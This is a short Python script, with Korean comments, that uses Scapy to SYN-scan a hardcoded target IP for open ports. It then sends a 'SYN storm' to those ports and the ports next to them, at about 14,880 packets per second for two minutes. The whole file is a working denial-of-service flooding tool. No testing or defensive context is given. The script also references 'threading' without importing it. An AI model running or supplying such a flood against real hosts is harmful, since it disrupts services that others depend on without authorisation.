from scapy.all import *
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# 설정된 매개변수
src_mac = "00:15:5d:2f:0c:ce"
src_ip = "172.20.77.55"
dst_mac = "b8:27:eb:be:09:41"
dst_ip = "192.168.11.63"

# 자동 시드 설정
random.seed()

# 목적지 포트 발견 함수 (오픈된 포트 검색)
open_ports = []
open_ports_lock = threading.Lock()

def scan_port(target_ip, port):
    pkt = IP(dst=target_ip) / TCP(dport=port, flags='S')
    response = sr1(pkt, timeout=0.5, verbose=0)
    if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
        with open_ports_lock:
            open_ports.append(port)
        send(IP(dst=target_ip) / TCP(dport=port, flags='R'), verbose=0)
        print(f"Open port found: {port}")

def discover_open_ports(target_ip):
    port_range = range(1024, 5000)
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, target_ip, port) for port in port_range]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Error scanning port: {e}")

# SYN 패킷 생성 함수
def generate_syn_packet(src_ip, dst_ip, dst_port):
    eth_frame = Ether(src=src_mac, dst=dst_mac)
    ip_frame = IP(src=src_ip, dst=dst_ip)
    tcp_frame = TCP(sport=random.randint(1024, 65535), dport=dst_port, flags="S")
    packet = eth_frame / ip_frame / tcp_frame
    return packet

def send_syn_storm(duration, rate_limit, open_ports):
    start_time = time.time()
    count = 0
    
    while time.time() - start_time < duration:
        for port in open_ports:
            packet = generate_syn_packet(src_ip, dst_ip, port)
            sendp(packet, verbose=0, iface="eth0")
            count += 1
            
            # 인접한 닫힌 포트에 대한 SYN 패킷 생성 및 전송
            if port > 1:
                packet = generate_syn_packet(src_ip, dst_ip, port - 1)
                sendp(packet, verbose=0, iface="eth0")
                count += 1
            if port < 65535:
                packet = generate_syn_packet(src_ip, dst_ip, port + 1)
                sendp(packet, verbose=0, iface="eth0")
                count += 1
            
            if count >= rate_limit:
                elapsed_time = time.time() - start_time
                remaining_time = max(0, 1 - elapsed_time % 1)
                time.sleep(remaining_time)
                count = 0

# 주요 실행 부분
packet_length = 60
duration = 120
rate_limit = 14880

print("Discovering open ports...")
discover_open_ports(dst_ip)

if not open_ports:
    print("No open ports discovered. Exiting.")
else:
    print(f"Open ports discovered: {open_ports}")
    print(f"Sending SYN Storm packets to {dst_ip}...")
    send_syn_storm(duration, rate_limit, open_ports)

